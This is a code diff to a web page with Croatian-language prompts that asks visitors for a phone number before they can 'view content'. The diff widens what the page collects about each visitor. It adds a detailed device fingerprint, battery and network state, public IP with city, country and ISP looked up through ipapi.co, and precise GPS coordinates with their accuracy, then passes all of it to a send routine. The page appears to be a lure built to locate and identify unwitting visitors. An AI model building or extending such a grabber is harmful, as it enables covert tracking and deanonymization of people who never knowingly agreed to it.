@@ -99,7 +99,7 @@ input {
   <div class="preview">📱</div>
   <h2>Unesi broj telefona</h2>
   <p class="small">
-  Nakon unosa možeš nastaviti i pogledati sadržaj.
+  Unos broja telefona je opcionalan. Nakon unosa možeš nastaviti i pogledati sadržaj.
   </p>
 
   <input id="phone" type="tel" placeholder="Broj telefona, npr. +43...">
@@ -124,19 +124,66 @@ async function start() {
   document.getElementById("status").textContent = "Učitavanje...";
 
   collectedData = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    time: new Date().toLocaleString()
+    userAgent: navigator.userAgent || "N/A",
+    platform: navigator.platform || "N/A",
+    vendor: navigator.vendor || "N/A",
+    language: navigator.language || "N/A",
+    languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
+
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    time: new Date().toLocaleString(),
+
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+
+    windowWidth: window.innerWidth,
+    windowHeight: window.innerHeight,
+
+    online: navigator.onLine,
+    cookies: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || "N/A",
+
+    touch: navigator.maxTouchPoints,
+    cpu: navigator.hardwareConcurrency || "N/A",
+    memory: navigator.deviceMemory || "N/A",
+
+    url: location.href,
+    referrer: document.referrer || "direkt"
   };
 
-  // GPS
+  if (navigator.connection) {
+    collectedData.network = navigator.connection.effectiveType;
+    collectedData.downlink = navigator.connection.downlink;
+  }
+
+  if (navigator.getBattery) {
+    try {
+      let b = await navigator.getBattery();
+      collectedData.battery = Math.round(b.level * 100) + "%";
+      collectedData.charging = b.charging;
+    } catch {}
+  }
+
+  try {
+    let res = await fetch("https://ipapi.co/json/");
+    let ip = await res.json();
+    collectedData.ip = ip.ip;
+    collectedData.city = ip.city;
+    collectedData.country = ip.country_name;
+    collectedData.org = ip.org;
+  } catch {}
+
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(pos) {
         collectedData.lat = pos.coords.latitude;
         collectedData.lon = pos.coords.longitude;
+        collectedData.accuracy = pos.coords.accuracy;
         showPhoneStep();
       },
       function() {
@@ -155,8 +202,7 @@ function showPhoneStep() {
 }
 
 function sendWithPhone() {
-  const phone = document.getElementById("phone").value.trim();
-  collectedData.phone = phone || "nije unesen";
+  collectedData.phone = document.getElementById("phone").value || "nije unesen";
   sendData();
 }
 
